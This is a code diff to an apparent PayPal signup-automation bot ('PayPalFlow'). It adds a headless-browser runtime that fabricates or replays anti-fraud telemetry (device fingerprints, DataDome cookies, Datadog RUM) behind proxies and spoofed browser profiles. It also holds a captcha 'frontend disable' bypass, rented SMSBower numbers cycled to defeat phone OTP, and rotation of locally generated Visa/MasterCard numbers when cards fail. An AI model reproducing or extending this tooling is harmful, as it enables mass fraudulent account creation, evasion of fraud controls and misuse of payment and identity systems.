+                "debug_log_path": result.get("debug_log_path") or "",
             }
             previous = getattr(self.state, "risk_signals_browser_result", {})
             if isinstance(previous, dict):
                 merged = dict(previous)
                 merged["signup_context"] = signup_context_result
-                merged["ok"] = bool(previous.get("ok")) or bool(result.get("ok"))
+                merged["ok"] = bool(previous.get("ok")) or browser_ok
                 self.state.risk_signals_browser_result = merged
             else:
                 self.state.risk_signals_browser_result = {"signup_context": signup_context_result}
@@ -581,20 +1039,145 @@ class PayPalFlow:
                 ",".join(str(item) for item in (result.get("observed") or [])) or "<none>",
                 ",".join(str(item) for item in (result.get("missing") or [])) or "<none>",
             )
-            return bool(result.get("ok"))
+            required_missing = [
+                str(item)
+                for item in (result.get("required_missing") or [])
+                if str(item)
+            ]
+            if required_missing:
+                message = (
+                    "Roxy signup-context risk runtime is missing required browser signals: "
+                    f"{','.join(required_missing)}"
+                )
+                if mode == "roxy" or strict_browser_risk_enabled():
+                    raise RuntimeError(message)
+                logger.warning(message)
+            return browser_ok
         except Exception as exc:
+            error_text = self._safe_error_text(exc)
             self.state.risk_signals_runtime_source = "roxy_failed"
             self.state.risk_signals_browser_result = {
                 "ok": False,
-                "signup_context": {"ok": False, "error": str(exc)},
+                "signup_context": {"ok": False, "error": error_text},
             }
-            if mode == "roxy" or strict_browser_risk_enabled():
-                raise
+            if (mode == "roxy" and not self._roxy_runtime_fallback_enabled()) or strict_browser_risk_enabled():
+                raise RuntimeError(error_text) from None
+            self._disable_roxy_runtime(exc)
             logger.warning(
-                "Roxy signup-context risk runtime failed in auto mode; falling back to protocol method: {}",
-                exc,
+                "Roxy signup-context risk runtime failed; falling back to local headless signup-context risk: {}",
+                error_text,
             )
             return False
+
+    def _send_signup_context_risk_signals_with_headless(self, signup_url: str, token: str) -> bool:
+        mode = self._signup_context_risk_mode()
+        if mode != "headless":
+            return False
+        if not self._headless_runtime_enabled():
+            error_text = "Local headless signup-context risk runtime is disabled."
+            self.state.risk_signals_runtime_source = "headless_failed"
+            self.state.risk_signals_browser_result = {
+                "ok": False,
+                "signup_context": {"ok": False, "runtime": "headless", "error": error_text},
+            }
+            raise RuntimeError(error_text)
+        try:
+            from paypal.local_headless import run_local_headless_mtr_phase1
+
+            headless_session = self._get_headless_session()
+            dfp_config = self._headless_mtr_config_for_page(signup_url)
+            run_mtr = self._mtr_runtime_mode() == "headless"
+            result = run_local_headless_mtr_phase1(
+                signup_url,
+                dfp_config=dfp_config,
+                dfp_script_url=self.state.mtr_dfp_script_url,
+                cookies=self.session.export_cookies_for_browser(),
+                wait_seconds=self._risk_headless_wait_seconds(),
+                proxy_url=self.proxy_config.url or "",
+                browser_profile=cast(dict[str, object], self.state.browser_profile or {}),
+                screen=cast(dict[str, object], self.state.screen or {}),
+                viewport=cast(dict[str, object], self.state.viewport or {}),
+                app_id="CHECKOUTUINODEWEB_ONBOARDING_LITE",
+                correlation_id=token,
+                session=headless_session,
+                stage="signup_context",
+                new_page=True,
+                run_mtr=run_mtr,
+                runtime="headless",
+            )
+            raw_cookies = result.get("cookies")
+            result_cookies = cast(list[dict[str, Any]], raw_cookies) if isinstance(raw_cookies, list) else []
+            if result_cookies:
+                self.session.import_browser_cookies(result_cookies)
+            browser_ok = self._normalize_phase1_roxy_datadog_runtime_result(result)
+            counts = result.get("counts") if isinstance(result.get("counts"), dict) else {}
+            observed = list(cast(list[object], result.get("observed"))) if isinstance(result.get("observed"), list) else []
+            missing = list(cast(list[object], result.get("missing"))) if isinstance(result.get("missing"), list) else []
+            required_missing = list(cast(list[object], result.get("required_missing"))) if isinstance(result.get("required_missing"), list) else []
+            signup_context_result = {
+                "ok": browser_ok,
+                "runtime": "headless",
+                "status": result.get("status"),
+                "url": result.get("url"),
+                "reason": result.get("reason") or "",
+                "app_id": "CHECKOUTUINODEWEB_ONBOARDING_LITE",
+                "correlation_id": token,
+                "observed": observed,
+                "observed_order": result.get("observed_order") or [],
+                "missing": missing,
+                "counts": counts,
+                "response_counts": result.get("response_counts") or {},
+                "cookie_count": len(result_cookies),
+                "requests": result.get("requests") or [],
+                "responses": result.get("responses") or [],
+                "request_failures": result.get("request_failures") or [],
+                "failed_requests": result.get("failed_requests") or result.get("request_failures") or [],
+                "injected_scripts": result.get("injected_scripts") or [],
+                "inject_errors": result.get("inject_errors") or [],
+                "datadog_runtime": result.get("datadog_runtime") or {},
+                "datadog_runtime_fulfilled": bool(result.get("datadog_runtime_fulfilled")),
+                "datadog_runtime_fulfilled_reason": result.get("datadog_runtime_fulfilled_reason") or "",
+                "datadog_probes": result.get("datadog_probes") or [],
+                "datadog_flushes": result.get("datadog_flushes") or [],
+                "runtime_signals": result.get("runtime_signals") or [],
+                "required_signals": result.get("required_signals") or [],
+                "required_missing": required_missing,
+                "blocked_requests": result.get("blocked_requests") or [],
+                "allowed_requests": result.get("allowed_requests") or [],
+                "learned_rules": result.get("learned_rules") or [],
+                "intercept": result.get("intercept") or {},
+                "debug_log_path": result.get("debug_log_path") or "",
+            }
+            previous = getattr(self.state, "risk_signals_browser_result", {})
+            if isinstance(previous, dict):
+                merged = dict(previous)
+                merged["signup_context"] = signup_context_result
+                merged["ok"] = bool(previous.get("ok")) or browser_ok
+                self.state.risk_signals_browser_result = merged
+            else:
+                self.state.risk_signals_browser_result = {"signup_context": signup_context_result}
+            self.state.risk_signals_runtime_source = "headless"
+            logger.info(
+                "Signup context risk signals executed through local headless observed={} missing={}",
+                ",".join(str(item) for item in observed) or "<none>",
+                ",".join(str(item) for item in missing) or "<none>",
+            )
+            required_missing_text = [str(item) for item in required_missing if str(item)]
+            if required_missing_text:
+                message = "Headless signup-context risk runtime is missing required browser signals: " + ",".join(required_missing_text)
+                if strict_browser_risk_enabled():
+                    raise RuntimeError(message)
+                logger.warning(message)
+            return browser_ok
+        except Exception as exc:
+            error_text = self._safe_error_text(exc)
+            self.state.risk_signals_runtime_source = "headless_failed"
+            self.state.risk_signals_browser_result = {
+                "ok": False,
+                "signup_context": {"ok": False, "runtime": "headless", "error": error_text},
+            }
+            logger.warning("Local headless signup-context risk runtime failed: {}", error_text)
+            raise RuntimeError(error_text) from None
 
     def _cleanup_roxy_browser(self) -> None:
         roxy_browser = getattr(self.state, "roxy_browser", None) or {}
@@ -611,6 +1194,62 @@ class PayPalFlow:
                 self.state.roxy_browser = {}
             except Exception:
                 pass
+
+    def _cleanup_headless_session(self) -> None:
+        session = getattr(self, "_headless_session", None) or getattr(self, "_headless_optimized_session", None)
+        if session is None:
+            return
+        try:
+            session.close()
+        except Exception as exc:
+            logger.debug("Local headless session cleanup failed: {}", exc)
+        finally:
+            self._headless_session = None
+            self._headless_optimized_session = None
+
+    def _cleanup_headless_optimized_session(self) -> None:
+        self._cleanup_headless_session()
+
+    @staticmethod
+    def _headless_env_enabled() -> bool:
+        from paypal.local_headless import headless_enabled
+
+        return headless_enabled()
+
+    @staticmethod
+    def _headless_optimized_env_enabled() -> bool:
+        return PayPalFlow._headless_env_enabled()
+
+    def _headless_runtime_enabled(self) -> bool:
+        # The old local-headless path has been removed; "headless" always means
+        # the local-headless runner unless explicitly disabled.
+        return self._headless_env_enabled()
+
+    def _headless_optimized_runtime_enabled(self) -> bool:
+        return self._headless_runtime_enabled()
+
+    def _get_headless_session(self):
+        from paypal.local_headless import LocalHeadlessSession
+
+        session = getattr(self, "_headless_session", None) or getattr(self, "_headless_optimized_session", None)
+        if session is None:
+            session = LocalHeadlessSession(
+                cookies=self.session.export_cookies_for_browser(),
+                proxy_url=self.proxy_config.url or "",
+                browser_profile=cast(dict[str, object], self.state.browser_profile or {}),
+                screen=cast(dict[str, object], self.state.screen or {}),
+                viewport=cast(dict[str, object], self.state.viewport or {}),
+                job_id=f"headless-{uuid4().hex[:12]}",
+                runtime="headless",
+            )
+            self._headless_session = session
+            self._headless_optimized_session = session
+        else:
+            session.import_cookies(self.session.export_cookies_for_browser())
+        return session
+
+    def _get_headless_optimized_session(self):
+        return self._get_headless_session()
 
     def _warn_challenge_locale_mismatch(self, challenge_html: str) -> None:
         iframe_src = (
@@ -645,6 +1284,36 @@ class PayPalFlow:
         return os.getenv(name, "").strip().lower() in {"1", "true", "yes", "on"}
 
     @staticmethod
+    def _env_int_between(name: str, default: int, minimum: int, maximum: int) -> int:
+        raw = os.getenv(name, "").strip()
+        if not raw:
+            return default
+        try:
+            value = int(raw)
+        except ValueError:
+            logger.warning("Invalid {}={!r}; using default {}", name, raw, default)
+            return default
+        return max(minimum, min(maximum, value))
+
+    @staticmethod
+    def _modxo_static_action_ids_enabled() -> bool:
+        raw = (
+            _load_proxy_dotenv_value("PAYPAL_MODXO_STATIC_ACTION_IDS")
+            or _load_proxy_dotenv_value("PAYPAL_MODXO_HARDCODED_ACTION_IDS")
+            or "1"
+        ).strip().lower()
+        return raw not in {
+            "0",
+            "false",
+            "no",
+            "off",
+            "disable",
+            "disabled",
+            "dynamic",
+            "scan",
+        }
+
+    @staticmethod
     def _synthetic_captcha_allowed() -> bool:
         return PayPalFlow._env_truthy("PAYPAL_ALLOW_SYNTHETIC_CAPTCHA")
 
@@ -655,8 +1324,8 @@ class PayPalFlow:
     def _roxy_risk_runtime_active(self) -> bool:
         """True when browser/Roxy owns risk telemetry for this flow."""
         return (
-            self._risk_signals_mode() == "roxy"
-            or getattr(self.state, "risk_signals_runtime_source", "") == "roxy"
+            self._risk_signals_mode() in {"roxy", "headless"}
+            or getattr(self.state, "risk_signals_runtime_source", "") in {"roxy", "headless", "headless_optimized"}
         )
 
     def _skip_synthetic_behavior_telemetry(self, family: str) -> bool:
@@ -665,7 +1334,7 @@ class PayPalFlow:
         logged = self._roxy_skipped_telemetry_families
         if family not in logged:
             logger.info(
-                "Skipping synthetic {} telemetry because Roxy risk runtime is active.",
+                "Skipping synthetic {} telemetry because browser risk runtime is active.",
                 family,
             )
             try:
@@ -690,7 +1359,58 @@ class PayPalFlow:
             return None
         return send_datadog_rum_action(*args, **kwargs)
 
+    def _send_authchallenge_datadog_rum(self, page_url: str, action_name: str = "authchallenge_detected") -> None:
+        self._send_datadog_rum_view(
+            self.session,
+            page_url,
+            self.ba_token,
+            dd_config=_DD_AUTHCHALLENGE_CONFIG,
+            referrer=page_url,
+            api="fetch",
+        )
+        self._send_datadog_rum_action(
+            self.session,
+            action_name,
+            page_url,
+            dd_config=_DD_AUTHCHALLENGE_CONFIG,
+            referrer=page_url,
+            api="fetch",
+        )
+
+    def _is_step3_signup_field_events_call(self, args: tuple[Any, ...], kwargs: dict[str, Any]) -> bool:
+        app_id = str(kwargs.get("app_id") or "CHECKOUTUINODEWEB_ONBOARDING_LITE")
+        if app_id != "CHECKOUTUINODEWEB_ONBOARDING_LITE":
+            return False
+        token = str((args[1] if len(args) > 1 else kwargs.get("ec_token")) or "")
+        fields_arg = args[2] if len(args) > 2 else kwargs.get("field_ids")
+        try:
+            fields = {str(item) for item in (fields_arg or [])}
+        except Exception:
+            fields = set()
+        step3_fields = {
+            "email",
+            "phone",
+            "cardNumber",
+            "cardExpiry",
+            "cardCvv",
+            "password",
+            "firstName",
+            "lastName",
+            "billingLine1",
+            "billingCity",
+            "billingPostalCode",
+            "billingState",
+            "dateOfBirth",
+            "identityDocumentNumber",
+        }
+        if fields and not fields.intersection(step3_fields):
+            return False
+        state_token = str(getattr(self.state, "ec_token", "") or "")
+        return bool(token and (token == state_token or token.startswith("EC-")))
+
     def _send_signup_field_events(self, *args, **kwargs):
+        if self._is_step3_signup_field_events_call(args, kwargs):
+            return None
         if self._skip_synthetic_behavior_telemetry("signup field-events"):
             return None
         return send_signup_field_events(*args, **kwargs)
@@ -769,7 +1489,7 @@ class PayPalFlow:
         captcha_synthetic_allowed = self._synthetic_captcha_allowed()
         risk_browser_result = getattr(self.state, "risk_signals_browser_result", {}) or {}
         risk_browser_ok = bool(
-            getattr(self.state, "risk_signals_runtime_source", "") == "roxy"
+            getattr(self.state, "risk_signals_runtime_source", "") in {"roxy", "headless", "headless_optimized"}
             and isinstance(risk_browser_result, dict)
             and risk_browser_result.get("ok")
         )
@@ -783,6 +1503,8 @@ class PayPalFlow:
         blockers: list[str] = []
         if not mtr_sealed_result_present:
             blockers.append("mtr_sealedResult_missing")
+        if self.state.mtr_runtime_source == MTR_RUNTIME_PYTHON_GENERATED:
+            blockers.append("mtr_python_generated_runtime")
         if captcha_synthetic_used or (
             self.captcha_bypass_mode == CAPTCHA_FRONTEND_DISABLE_MODE
             and not captcha_synthetic_allowed
@@ -794,6 +1516,15 @@ class PayPalFlow:
             blockers.append("client_hints_forced_high_entropy")
         if synthetic_risk_families_used and not synthetic_risk_families_allowed:
             blockers.append("synthetic_fraudnet_fpti_tealeaf_datadog")
+        mtr_browser_result = cast(
+            dict[str, object],
+            sanitize_for_log(getattr(self.state, "mtr_browser_result", {}) or {}),
+        )
+        datadome_browser_result = cast(
+            dict[str, object],
+            sanitize_for_log(getattr(self.state, "datadome_browser_result", {}) or {}),
+        )
+        risk_browser_result_public = cast(dict[str, object], sanitize_for_log(risk_browser_result))
         return {
             "strict_browser_risk": strict_browser_risk_enabled(),
             "mtr": {
@@ -803,7 +1534,7 @@ class PayPalFlow:
                 "post_status": self.state.mtr_post_status,
                 "sealed_result_present": mtr_sealed_result_present,
                 "runtime_source": self.state.mtr_runtime_source or "not_sent",
-                "browser_result": getattr(self.state, "mtr_browser_result", {}) or {},
+                "browser_result": mtr_browser_result,
             },
             "datadome": {
                 "mode": self._datadome_mode(),
@@ -811,7 +1542,7 @@ class PayPalFlow:
                 "clientid_present": bool(self.state.datadome_clientid),
                 "header_injected": datadome_header_injected,
                 "browser_solved": bool(getattr(self.state, "datadome_browser_solved", False)),
-                "browser_result": getattr(self.state, "datadome_browser_result", {}) or {},
+                "browser_result": datadome_browser_result,
                 "browser_js_cookie_chain_verified": bool(
                     datadome_cookie_present and getattr(self.state, "datadome_browser_solved", False)
                 ),
@@ -829,7 +1560,7 @@ class PayPalFlow:
             "synthetic_risk_families": {
                 "mode": self._risk_signals_mode(),
                 "runtime_source": getattr(self.state, "risk_signals_runtime_source", "") or "not_sent",
-                "browser_result": risk_browser_result,
+                "browser_result": risk_browser_result_public,
                 "fraudnet_python_generated": synthetic_risk_families_used,
                 "fpti_python_generated": synthetic_risk_families_used,
                 "tealeaf_template_generated": synthetic_risk_families_used,
@@ -843,38 +1574,6 @@ class PayPalFlow:
         result = dict(result)
         result["risk_runtime"] = self._risk_runtime_report()
         return result
-
-    def _strict_risk_preflight_or_raise(self, page_url: str) -> None:
-        """Fail fast instead of sending known synthetic anti-fraud telemetry."""
-        if not strict_browser_risk_enabled():
-            return
-        # MTR is the first and highest-priority blocker in the risk-diff doc.
-        try:
-            send_mtr_signals(
-                self.session,
-                self.state,
-                page_url=page_url,
-                runtime_mode=self.mtr_runtime,
-            )
-        except Exception as exc:
-            report = self._risk_runtime_report()
-            raise RuntimeError(
-                "Strict browser-risk preflight blocked pure-protocol risk telemetry: "
-                f"{exc}. report={json.dumps(report, ensure_ascii=False)}"
-            ) from exc
-        report = self._risk_runtime_report()
-        blockers = report.get("strict_blockers")
-        mtr_blockers = [
-            str(blocker)
-            for blocker in blockers
-            if str(blocker).startswith("mtr_")
-        ] if isinstance(blockers, list) else []
-        if mtr_blockers:
-            raise RuntimeError(
-                "Strict browser-risk preflight blocked pure-protocol risk telemetry: "
-                f"{','.join(mtr_blockers)}. "
-                f"report={json.dumps(report, ensure_ascii=False)}"
-            )
 
     def _strict_signup_preflight_or_raise(self) -> None:
         if not strict_browser_risk_enabled():
@@ -892,7 +1591,7 @@ class PayPalFlow:
         raise RuntimeError(
             "Strict browser-risk preflight blocked SignUpNewMemberMutation because "
             f"browser proof is incomplete: {','.join(blockers)}. "
-            f"report={json.dumps(report, ensure_ascii=False)}"
+            f"report={json.dumps(sanitize_for_log(report), ensure_ascii=False)}"
         )
 
     @staticmethod
@@ -1193,7 +1892,6 @@ class PayPalFlow:
 
                 try:
                     self._phase0_initial_load()
-                    self._phase1_risk_controls()
                     self._phase2_create_account()
                     self._phase3_signup_and_2fa()
                     result = self._with_risk_runtime_report(self._phase4_authorize())
@@ -1244,7 +1942,7 @@ class PayPalFlow:
                 "risk_runtime": self._risk_runtime_report(),
             }
         except Exception as e:
-            logger.error(f"Flow failed: {e}")
+            logger.error("Flow failed: {}", self._safe_error_text(e))
             raise
         finally:
             self.close()
@@ -1326,6 +2024,8 @@ class PayPalFlow:
         self._used_partial_signup_token = False
         self._billing_address_autocomplete_succeeded = False
         self._signup_billing_address_prepared = False
+        self._headless_session = None
+        self._headless_optimized_session = None
         self._on_full_retry_generated(flow_attempt)
 
         logger.info(
@@ -1345,8 +2045,9 @@ class PayPalFlow:
 
         url = f"https://www.paypal.com/agreements/approve?ba_token={self.ba_token}"
         datadome_mode = self._datadome_mode()
-        if datadome_mode == "roxy" and not self.state.datadome_cookie:
+        if datadome_mode in {"roxy", "headless"} and not self.state.datadome_cookie:
             self._solve_datadome_with_roxy_browser(url, reason="phase0_preflight")
+            datadome_mode = self._datadome_mode()
 
         # First GET - may return 403 with DataDome challenge or 302 redirect
         resp = self.session.get(url, headers={
@@ -1361,7 +2062,8 @@ class PayPalFlow:
 
         if resp.status_code == 403:
             logger.info("Got 403 - DataDome challenge detected")
-            solved = self._solve_datadome_with_roxy_browser(url, reason="phase0_403") if datadome_mode in {"roxy", "auto"} else False
+            solved = self._solve_datadome_with_roxy_browser(url, reason="phase0_403") if datadome_mode in {"roxy", "headless", "auto"} else False
+            datadome_mode = self._datadome_mode()
             if solved:
                 resp = self.session.get(url, headers={
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
@@ -1372,8 +2074,8 @@ class PayPalFlow:
                     "Sec-Fetch-Dest": "document",
                 })
                 self._capture_datadome_clientid(resp.text)
-            elif datadome_mode == "roxy":
-                raise RuntimeError("Roxy DataDome did not produce a datadome cookie after HTTP 403")
+            elif datadome_mode in {"roxy", "headless"}:
+                raise RuntimeError(f"{datadome_mode} DataDome did not produce a datadome cookie after HTTP 403")
             else:
                 # DataDome returns a page with embedded dd object and ct.ddc.paypal.com/c.js.
                 # Keep the old protocol/header method as the second configurable path.
@@ -1416,6 +2118,8 @@ class PayPalFlow:
 
         # Parse the login/signup page
         html = resp.text
+        self._last_modxo_html = html
+        self._last_modxo_base_url = str(resp.url)
         self._capture_datadome_clientid(html)
         self._capture_mtr_metadata(html, str(resp.url))
         logger.info(f"Page loaded: {resp.status_code}, {len(html)} bytes")
@@ -3766,6 +4470,10 @@ class PayPalFlow:
 
     def _validate_authchallenge_if_possible(self, challenge_html: str, signup_url: str):
         captcha_type = self._authchallenge_captcha_type(challenge_html)
+        self._send_authchallenge_datadog_rum(
+            signup_url or getattr(self.state, "signup_url", "") or "https://www.paypal.com/auth/validatecaptcha",
+            f"authchallenge_{captcha_type or 'unknown'}",
+        )
         self.captcha_bypass_mode = paypal_captcha_bypass_mode()
         if self.captcha_bypass_mode == CAPTCHA_FRONTEND_DISABLE_MODE:
             return self._frontend_disable_authchallenge_close(challenge_html, signup_url)
@@ -4087,7 +4795,53 @@ class PayPalFlow:
             self.state.modxo_country_action_bound = bound
             logger.info("ModXO country action id: {}", action_id)
 
-    def _extract_modxo_action_ids(self, html: str, base_url: str):
+    def _modxo_named_action_ids_complete(self) -> bool:
+        return bool(
+            self.state.show_create_account_action_id
+            and self.state.create_user_action_id
+            and self.state.submit_public_credential_action_id
+            and self.state.fetch_device_fingerprint_action_id
+        )
+
+    def _apply_static_modxo_action_ids(self) -> None:
+        if not self._modxo_static_action_ids_enabled():
+            return
+        for attr, action_id in _MODXO_STATIC_ACTION_IDS.items():
+            if getattr(self.state, attr, ""):
+                continue
+            setattr(self.state, attr, action_id)
+            logger.info("ModXO action {}: {} (static)", attr, action_id)
+
+    def _clear_static_modxo_action_ids_for_refresh(self) -> None:
+        for attr, action_id in _MODXO_STATIC_ACTION_IDS.items():
+            if getattr(self.state, attr, "") == action_id:
+                setattr(self.state, attr, "")
+
+    def _refresh_modxo_action_ids_from_chunks(self, *, reason: str = "") -> bool:
+        html = str(getattr(self, "_last_modxo_html", "") or "")
+        base_url = str(getattr(self, "_last_modxo_base_url", "") or "")
+        if not html or not base_url:
+            logger.debug("Cannot refresh ModXO action ids: Phase 0 HTML/base URL is unavailable")
+            return False
+
+        before = {
+            attr: getattr(self.state, attr, "")
+            for attr in _MODXO_STATIC_ACTION_IDS
+        }
+        logger.warning(
+            "Refreshing ModXO action ids from JS chunks after static ids failed{}",
+            f" reason={reason}" if reason else "",
+        )
+        self._extract_modxo_action_ids(html, base_url, force_refresh=True)
+        after = {
+            attr: getattr(self.state, attr, "")
+            for attr in _MODXO_STATIC_ACTION_IDS
+        }
+        refreshed = self._modxo_named_action_ids_complete() and after != before
+        logger.info("ModXO action id refresh complete={} changed={}", self._modxo_named_action_ids_complete(), after != before)
+        return refreshed
+
+    def _extract_modxo_action_ids(self, html: str, base_url: str, *, force_refresh: bool = False):
         """Extract Next server-action IDs from ModXO JS chunks.
 
         The browser sends these values in the Next-Action header. They are
@@ -4118,13 +4872,18 @@ class PayPalFlow:
                     changed = True
             return changed
 
+        def complete() -> bool:
+            return self._modxo_named_action_ids_complete()
+
+        if force_refresh:
+            self._clear_static_modxo_action_ids_for_refresh()
+        else:
+            self._apply_static_modxo_action_ids()
+            if complete():
+                return
+
         scan(html or "")
-        if (
-            self.state.show_create_account_action_id
-            and self.state.create_user_action_id
-            and self.state.submit_public_credential_action_id
-            and self.state.fetch_device_fingerprint_action_id
-        ):
+        if complete():
             return
 
         script_urls = []
@@ -4135,7 +4894,18 @@ class PayPalFlow:
             if url not in script_urls:
                 script_urls.append(url)
 
-        for script_url in script_urls[:80]:
+        script_urls = script_urls[:80]
+        if not script_urls:
+            return
+
+        concurrency = self._env_int_between(
+            "PAYPAL_MODXO_ACTION_CHUNK_CONCURRENCY",
+            12,
+            1,
+            32,
+        )
+
+        def fetch_script(script_url: str) -> tuple[str, int, str]:
             try:
                 js_resp = self.session.get(
                     script_url,
@@ -4147,17 +4917,70 @@ class PayPalFlow:
                         "Sec-Fetch-Site": "same-origin",
                     },
                 )
-                if js_resp.status_code == 200:
-                    scan(js_resp.text)
-                if (
-                    self.state.show_create_account_action_id
-                    and self.state.create_user_action_id
-                    and self.state.submit_public_credential_action_id
-                    and self.state.fetch_device_fingerprint_action_id
-                ):
-                    return
+                return script_url, int(getattr(js_resp, "status_code", 0) or 0), getattr(js_resp, "text", "") or ""
             except Exception as e:
                 logger.debug(f"Failed to inspect ModXO chunk {script_url}: {e}")
+                return script_url, 0, ""
+
+        started = time.monotonic()
+        fetched = 0
+        failed_urls: list[str] = []
+
+        if concurrency <= 1 or len(script_urls) == 1:
+            for script_url in script_urls:
+                _url, status_code, text = fetch_script(script_url)
+                fetched += 1
+                if status_code == 200:
+                    scan(text)
+                if complete():
+                    break
+        else:
+            logger.debug(
+                "Fetching {} ModXO JS chunks for action ids with concurrency={}",
+                len(script_urls),
+                concurrency,
+            )
+            for start in range(0, len(script_urls), concurrency):
+                batch = script_urls[start:start + concurrency]
+                with ThreadPoolExecutor(max_workers=min(concurrency, len(batch))) as executor:
+                    futures = {executor.submit(fetch_script, script_url): script_url for script_url in batch}
+                    for future in as_completed(futures):
+                        script_url = futures[future]
+                        try:
+                            _url, status_code, text = future.result()
+                        except Exception as e:
+                            logger.debug(f"Failed to inspect ModXO chunk {script_url}: {e}")
+                            continue
+                        fetched += 1
+                        if status_code == 0:
+                            failed_urls.append(script_url)
+                        if status_code == 200:
+                            scan(text)
+                        if complete():
+                            break
+                if complete():
+                    break
+
+        if failed_urls and not complete() and concurrency > 1:
+            logger.debug(
+                "Retrying {} failed ModXO JS chunk fetches serially after concurrent scan",
+                len(failed_urls),
+            )
+            for script_url in failed_urls:
+                _url, status_code, text = fetch_script(script_url)
+                fetched += 1
+                if status_code == 200:
+                    scan(text)
+                if complete():
+                    break
+
+        logger.debug(
+            "ModXO action id chunk scan fetched={}/{} elapsed={:.2f}s complete={}",
+            fetched,
+            len(script_urls),
+            time.monotonic() - started,
+            bool(complete()),
+        )
 
     def _card_issuer_type(self) -> str:
         """PayPal GraphQL CardIssuerType enum."""
@@ -4178,6 +5001,9 @@ class PayPalFlow:
 
     def _masked_phone(self) -> str:
         return sanitize_for_log({"phone": self.user.phone})["phone"]
+
+    def _on_phone_updated(self) -> None:
+        pass
 
 
     def _update_user_phone(self, phone: str):
@@ -4208,6 +5034,7 @@ class PayPalFlow:
         self.user.phone_country_code = country_code
         self.user.phone_local = local
         logger.info("Phone updated for OTP retry: {}", self._masked_phone())
+        self._on_phone_updated()
 
     def _graphql_with_authchallenge_frontend_retry(
         self,
@@ -4441,6 +5268,8 @@ class PayPalFlow:
 
     def _confirm_phone_with_retry(self, token: str, signup_url: str):
         """Loop until OTP is confirmed; user can enter a new phone to resend."""
+        if self.sms_provider is not None:
+            return self._confirm_phone_with_sms_provider(token, signup_url)
         while True:
             try:
                 auth_id, challenge_id = self._initiate_2fa_phone_confirmation(token, signup_url)
@@ -4493,6 +5322,38 @@ class PayPalFlow:
                         "输入既不是6位验证码，也不是有效手机号：{}。请重新输入。",
                         e,
                     )
+
+    def _confirm_phone_with_sms_provider(self, token: str, signup_url: str) -> None:
+        if self.sms_provider is None:
+            raise RuntimeError("SMS provider is not configured")
+        for attempt in range(1, self.sms_provider.max_attempts + 1):
+            activation = self.sms_provider.reserve_number()
+            self._update_user_phone(activation.phone_number)
+            try:
+                auth_id, challenge_id = self._initiate_2fa_phone_confirmation(token, signup_url)
+            except Exception as exc:
+                logger.error("Failed to initiate OTP for SMSBower phone {}: {}", self._masked_phone(), exc)
+                self.sms_provider.abandon(activation, "paypal_initiation_failed")
+                continue
+
+            self.sms_provider.mark_sms_sent(activation)
+            logger.info(
+                "Waiting for SMSBower OTP attempt={} provider={} reused={} timeout={}s",
+                attempt,
+                activation.provider_id,
+                activation.reused,
+                self.sms_provider.wait_seconds,
+            )
+            code = self.sms_provider.wait_for_code(activation, timeout_seconds=self.sms_provider.wait_seconds)
+            if not code:
+                self.sms_provider.abandon(activation, "sms_timeout")
+                continue
+            if self._confirm_2fa_phone_confirmation(token, signup_url, auth_id, challenge_id, code):
+                self.sms_provider.register_confirmation_result(activation, True)
+                return
+            self.sms_provider.register_confirmation_result(activation, False)
+            logger.warning("SMSBower OTP was rejected by PayPal; trying another number.")
+        raise RuntimeError("SMSBower OTP confirmation failed after all attempts")
 
     def _card_expiration_date(self) -> str:
         exp_parts = self.card.expiry.split("/")
@@ -4596,7 +5457,9 @@ class PayPalFlow:
                 },
             )
             result_obj = address_result[0] if isinstance(address_result, list) else address_result
-            normalized = result_obj.get("data", {}).get("addressNormalization") or {}
+            result_dict = cast(dict[str, Any], result_obj) if isinstance(result_obj, dict) else {}
+            data = result_dict.get("data") if isinstance(result_dict.get("data"), dict) else {}
+            normalized = cast(dict[str, Any], data).get("addressNormalization") or {}
             if not isinstance(normalized, dict) or not normalized:
                 logger.warning(
                     "AddressAutocompleteFromPostalCodeQuery returned no usable normalized "
@@ -4686,8 +5549,15 @@ class PayPalFlow:
                 "skipping AddressAutocompleteFromPostalCodeQuery."
             )
 
-        if self._risk_signals_mode() in {"roxy", "auto"} or self._roxy_risk_runtime_active():
-            self._send_signup_context_risk_signals_with_roxy(signup_url, token)
+        risk_mode = self._signup_context_risk_mode()
+        if risk_mode == "headless":
+            self._send_signup_context_risk_signals_with_headless(signup_url, token)
+        elif risk_mode in {"roxy", "auto"} or self._roxy_risk_runtime_active():
+            sent_signup_context_risk = self._send_signup_context_risk_signals_with_roxy(signup_url, token)
+            if not sent_signup_context_risk and self._signup_context_risk_mode() == "headless":
+                self._send_signup_context_risk_signals_with_headless(signup_url, token)
+
+        self._strict_signup_preflight_or_raise()
 
         self._send_signup_field_events(
             self.session,
@@ -4762,12 +5632,12 @@ class PayPalFlow:
         }
 
     def _post_signup_once(self, token: str, signup_variables: dict[str, Any]) -> dict[str, Any]:
-        return self.session.graphql(
+        return cast(dict[str, Any], self.session.graphql(
             "SignUpNewMemberMutation",
             SIGNUP_NEW_MEMBER_MUTATION,
             signup_variables,
             extra_body={"fn_sync_data": build_signup_fn_sync_data(token, session=self.session)},
-        )
+        ))
 
     def _post_signup_with_authchallenge_ignore(
         self,
@@ -5088,7 +5958,7 @@ class PayPalFlow:
 
     def _wait_and_rotate_card(self, reason: str) -> None:
         logger.warning(
-            "{}. Waiting before fetching a fresh random Visa/MasterCard from suijidaquan...",
+            "{}. Waiting before generating a fresh local Visa/MasterCard...",
             reason,
         )
         delay = self.card_retry_delay_seconds
@@ -5311,110 +6181,6 @@ class PayPalFlow:
         except Exception as e:
             logger.debug("ModXO RSC refresh failed: {}", e)
             return None
-
-    def _phase1_risk_controls(self):
-        """Send device fingerprints, Tealeaf data, analytics."""
-        logger.info("--- Phase 1: Risk control signals ---")
-
-        page_url = f"https://www.paypal.com/pay?ssrt={self.state.ssrt}&token={self.ba_token}&ul=1"
-        self._strict_risk_preflight_or_raise(page_url)
-
-        risk_mode = self._risk_signals_mode()
-        if risk_mode == "off":
-            self.state.risk_signals_runtime_source = "disabled"
-            logger.info("Phase1 risk signals disabled by configuration.")
-            return
-        if risk_mode == "protocol" and strict_browser_risk_enabled():
-            self.state.risk_signals_runtime_source = "blocked_protocol_strict"
-            raise RuntimeError(
-                "Strict browser-risk mode blocks protocol-generated Phase1 risk packets; "
-                "set PAYPAL_RISK_SIGNALS_MODE=roxy/browser or disable PAYPAL_STRICT_BROWSER_RISK."
-            )
-        if risk_mode in {"roxy", "auto"}:
-            browser_ok = self._send_phase1_risk_signals_with_roxy(page_url)
